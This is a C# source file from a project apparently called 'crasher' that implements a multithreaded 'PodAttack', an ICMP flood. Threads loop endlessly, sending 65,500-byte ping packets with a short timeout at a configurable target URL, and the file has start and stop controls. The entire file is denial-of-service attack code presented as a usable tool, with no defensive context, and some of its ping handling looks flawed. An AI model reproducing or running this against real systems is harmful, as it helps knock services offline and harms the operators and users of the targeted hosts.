using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using crasher.Model;

namespace crasher.Attacks
{
    
    public class PodAttack
    {
        private static Thread[] threads;
        private static bool stopFlag = false;
        private static Uri Url;
        private static bool ThreadsStarted = false;
        private static int packetSize = 65500;

        public static void Start()
        {
            Console.Clear();
            Url = new Uri(AttackSettings.Url);

            Console.WriteLine("Threading mode: " + AttackSettings.Threading);
            if (AttackSettings.Threading)
            {
                threads = new Thread[AttackSettings.Threads];
                StartAsyncAttack();
            }
            else
            {
                stopFlag = false;
                StartAttack();
            }

            Console.WriteLine("Started client attack");
        }

        /**
         * Attacco sfruttando i thread
         * **/
        private static void StartAsyncAttack()
        {
            for (int i = 0; i < threads.Length; i++)
            {
                threads[i] = new Thread(StartAttack);
                threads[i].Start();

                Console.WriteLine("[INFO] Thread n." + i + " started attacking target: " + Url.ToString());
            }

            ThreadsStarted = true;
        }

        /**
         * Attacco utilizzando nessun thread.
         * **/
        private static void StartAttack()
        {
            while (!stopFlag)
            {
                if (ThreadsStarted || !AttackSettings.Threading)
                {
                    bool requestStatus = false;

                    SendPing(Url, out requestStatus);

                    if (requestStatus)
                    {
                        Console.WriteLine("Ping done");
                    }
                    else
                    {
                        Console.WriteLine("Ping failed..");
                    }
                }
                else if (!ThreadsStarted)
                {
                    System.Threading.Thread.Sleep(250);
                }
            }
        }

        /**
         * Ferma l'attacco a seconda del tipo utilizzato
         * **/
        public static void Stop()
        {
            if (AttackSettings.Threading)
                StopAsyncAttack();
            else
                StopAttack();
        }

        /**
         * Ferma l'attacco senza thread utilizzando un flag che genera un break
         */
        private static void StopAttack()
        {
            stopFlag = true;
        }

        /**
        * Esegue l'abort su tutti i thread.
        * **/
        private static void StopAsyncAttack()
        {
            foreach (Thread thread in threads)
            {
                thread.Abort("Stopped attack by user");
            }
        }


        public static void SendPing(Uri url, out bool status)
        {
            Ping client = new Ping();
            try
            {
                Byte[] packet = new byte[packetSize];
                int timeout = 10;
                client.SendPingAsync(Url.ToString(),timeout,packet);

            }
            catch (PingException pe)
            {
                Console.WriteLine("ERROR: " + pe.Message);
                status = false;
                return;
            }
            finally
            {
                client.Dispose();
            }

            status = true;
        }
    }
}
